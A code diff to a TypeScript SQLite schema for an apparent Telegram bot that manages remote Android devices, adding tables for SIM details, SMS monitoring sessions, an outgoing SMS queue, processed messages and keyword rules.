@@ -9,6 +9,7 @@ export function initializeDatabase(): void {
 
     db.exec(`
         CREATE TABLE IF NOT EXISTS users (
+
             id INTEGER PRIMARY KEY AUTOINCREMENT,
 
             telegram_id INTEGER UNIQUE NOT NULL,
@@ -29,6 +30,25 @@ export function initializeDatabase(): void {
 
             FOREIGN KEY (license_id)
                 REFERENCES licenses(id)
+
+        );
+    `);
+
+    // ---------------- VERIFICATION CODES ----------------
+
+    db.exec(`
+        CREATE TABLE IF NOT EXISTS verification_codes (
+
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+
+            telegram_id INTEGER UNIQUE NOT NULL,
+
+            code TEXT UNIQUE NOT NULL,
+
+            expires_at DATETIME NOT NULL,
+
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+
         );
     `);
 
@@ -100,15 +120,33 @@ export function initializeDatabase(): void {
 
             device_name TEXT,
 
-            phone_number TEXT,
+            note TEXT,
+
+            manufacturer TEXT,
+
+            brand TEXT,
 
             model TEXT,
 
             android_version TEXT,
 
+            phone_number TEXT,
+
+            sim1_number TEXT,
+
+            sim1_carrier TEXT,
+
+            sim2_number TEXT,
+
+            sim2_carrier TEXT,
+
+            active_sim INTEGER DEFAULT 1,
+
             battery INTEGER DEFAULT 0,
 
             sim_count INTEGER DEFAULT 1,
+
+            network_type TEXT,
 
             status TEXT DEFAULT 'offline',
 
@@ -125,18 +163,20 @@ export function initializeDatabase(): void {
         );
     `);
 
-    // ---------------- MONITOR GROUPS ----------------
+    // ---------------- MONITOR CHATS ----------------
 
     db.exec(`
-        CREATE TABLE IF NOT EXISTS monitor_groups (
+        CREATE TABLE IF NOT EXISTS monitor_chats (
 
             id INTEGER PRIMARY KEY AUTOINCREMENT,
 
             telegram_id INTEGER NOT NULL,
 
-            group_id TEXT UNIQUE NOT NULL,
+            chat_id TEXT UNIQUE NOT NULL,
 
-            group_name TEXT,
+            chat_title TEXT,
+
+            chat_type TEXT NOT NULL,
 
             verified INTEGER DEFAULT 0,
 
@@ -166,6 +206,123 @@ export function initializeDatabase(): void {
 
             FOREIGN KEY (backend_id)
                 REFERENCES backends(id)
+
+        );
+    `);
+
+    // ---------------- MONITORING ----------------
+
+    db.exec(`
+        CREATE TABLE IF NOT EXISTS monitoring_sessions (
+
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+
+            telegram_id INTEGER UNIQUE NOT NULL,
+
+            backend_id INTEGER NOT NULL,
+
+            device_id TEXT NOT NULL,
+
+            sim_slot INTEGER NOT NULL,
+
+            chat_id TEXT NOT NULL,
+
+            status TEXT DEFAULT 'running',
+
+            started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+
+            expires_at DATETIME NOT NULL,
+
+            warning_sent INTEGER DEFAULT 0,
+
+            stopped_reason TEXT,
+
+            stopped_at DATETIME,
+
+            FOREIGN KEY (backend_id)
+                REFERENCES backends(id)
+                ON DELETE CASCADE
+
+        );
+    `);
+
+    // ---------------- SMS QUEUE ----------------
+
+    db.exec(`
+        CREATE TABLE IF NOT EXISTS sms_queue (
+
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+
+            telegram_id INTEGER NOT NULL,
+
+            backend_id INTEGER NOT NULL,
+
+            device_id TEXT NOT NULL,
+
+            command_id TEXT UNIQUE NOT NULL,
+
+            phone_number TEXT NOT NULL,
+
+            message TEXT NOT NULL,
+
+            sim_slot INTEGER NOT NULL,
+
+            status TEXT DEFAULT 'queued',
+
+            firebase_path TEXT,
+
+            queued_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+
+            processed_at DATETIME,
+
+            completed_at DATETIME,
+
+            error_message TEXT
+
+        );
+    `);
+
+    // ---------------- PROCESSED SMS ----------------
+
+    db.exec(`
+        CREATE TABLE IF NOT EXISTS processed_sms (
+
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+
+            backend_id INTEGER NOT NULL,
+
+            device_id TEXT NOT NULL,
+
+            source TEXT NOT NULL,
+
+            unique_key TEXT NOT NULL,
+
+            processed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+
+            UNIQUE(
+                backend_id,
+                device_id,
+                source,
+                unique_key
+            )
+
+        );
+    `);
+
+    // ---------------- KEYWORDS ----------------
+
+    db.exec(`
+        CREATE TABLE IF NOT EXISTS keyword_rules (
+
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+
+            telegram_id INTEGER UNIQUE NOT NULL,
+
+            keyword TEXT NOT NULL,
+
+            enabled INTEGER DEFAULT 1,
+
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
 
         );
     `);
